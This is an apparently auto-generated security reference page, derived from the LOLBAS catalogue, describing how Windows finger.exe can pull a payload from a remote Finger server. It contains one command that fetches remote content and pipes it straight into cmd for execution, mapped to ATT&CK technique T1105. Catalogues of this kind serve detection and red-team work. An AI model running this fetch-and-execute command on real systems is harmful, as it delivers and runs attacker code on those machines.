---
parsed_by: focuslocust
source: commands
type: generated
---
# Finger Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Finger.exe

Tool page: [Finger.exe](../../tools/windows/finger.exe.md)

### Download malicious payload

```text
finger user@example.host.com | more +2 | cmd
```

Description:

Downloads payload from remote Finger server. This example connects to "example.host.com" asking for user "user"; the result could contain malicious shellcode which is executed by the cmd process.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Finger.yml` |
| Evidence | Command preserved from source parser. |
